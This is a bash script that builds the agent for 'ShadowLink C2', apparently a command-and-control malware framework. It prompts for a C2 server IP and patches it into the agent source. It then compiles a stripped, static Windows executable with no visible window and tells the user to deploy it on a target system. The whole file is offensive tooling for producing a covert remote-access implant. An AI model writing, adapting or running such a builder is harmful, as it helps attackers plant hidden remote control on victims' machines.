#!/bin/bash

# ==========================================
# SHADOWLINK C2 - AGENT BUILDER
# ==========================================

# Colors
GREEN='\033[0;32m'
RED='\033[0;31m'
YELLOW='\033[1;33m'
CYAN='\033[0;36m'
MAGENTA='\033[0;35m'
NC='\033[0m'

# ==========================================
# New Professional Logo
# ==========================================

echo -e "${MAGENTA}"

echo "   ███████╗██╗  ██╗ █████╗ ██████╗  ██████╗ ██╗    ██╗██╗     ██╗███╗   ██╗██╗  ██╗"
echo "   ██╔════╝██║  ██║██╔══██╗██╔══██╗██╔═══██╗██║    ██║██║     ██║████╗  ██║██║ ██╔╝"
echo "   ███████╗███████║███████║██║  ██║██║   ██║██║ █╗ ██║██║     ██║██╔██╗ ██║█████╔╝ "
echo "   ╚════██║██╔══██║██╔══██║██║  ██║██║   ██║██║███╗██║██║     ██║██║╚██╗██║██╔═██╗ "
echo "   ███████║██║  ██║██║  ██║██████╔╝╚██████╔╝╚███╔███╔╝███████╗██║██║ ╚████║██║  ██╗"
echo "   ╚══════╝╚═╝  ╚═╝╚═╝  ╚═╝╚═════╝  ╚═════╝  ╚══╝╚══╝ ╚══════╝╚═╝╚═╝  ╚═══╝╚═╝  ╚═╝"

echo -e "${NC}"

echo -e "${CYAN}           ShadowLink C2 — Agent Builder${NC}"
echo ""

# ==========================================
# Check for MinGW
# ==========================================

echo -e "[*] Checking for MinGW Compiler..."

if ! command -v x86_64-w64-mingw32-g++ &> /dev/null; then

    echo -e "${RED}[!] MinGW compiler not found.${NC}"
    echo "[*] Installing mingw-w64..."

    sudo apt-get update
    sudo apt-get install -y mingw-w64
    
    if ! command -v x86_64-w64-mingw32-g++ &> /dev/null; then

        echo -e "${RED}[-] Installation failed.${NC}"
        echo "Install manually: sudo apt install mingw-w64"
        exit 1

    fi

else

    echo -e "${GREEN}[+] Compiler detected.${NC}"

fi


# ==========================================
# Configuration
# ==========================================

DEFAULT_IP="127.0.0.1"

read -p "[?] Enter C2 Server IP (Default: $DEFAULT_IP): " USER_IP

SERVER_IP=${USER_IP:-$DEFAULT_IP}

echo -e "[*] Configuring agent to connect: ${GREEN}$SERVER_IP${NC}"


# ==========================================
# Patch main.cpp
# ==========================================

sed -i "s/#define C2_SERVER \".*\"/#define C2_SERVER \"$SERVER_IP\"/" src/main.cpp


# ==========================================
# Compile Agent
# ==========================================

echo "[*] Building agent payload..."

x86_64-w64-mingw32-g++ \
-O3 \
-s \
-static \
-mwindows \
src/main.cpp \
-o Agent.exe \
-lws2_32 \
-lwininet \
-ladvapi32 \
-lshell32 \
-liphlpapi


# ==========================================
# Result
# ==========================================

if [ -f "Agent.exe" ]; then

    echo ""
    echo -e "${GREEN}[SUCCESS] Agent compiled.${NC}"
    echo -e "[OUTPUT] ${GREEN}Agent.exe${NC}"
    echo -e "[INFO] Deploy on target system."

else

    echo -e "${RED}[FAILED] Compilation error.${NC}"
    exit 1

fi
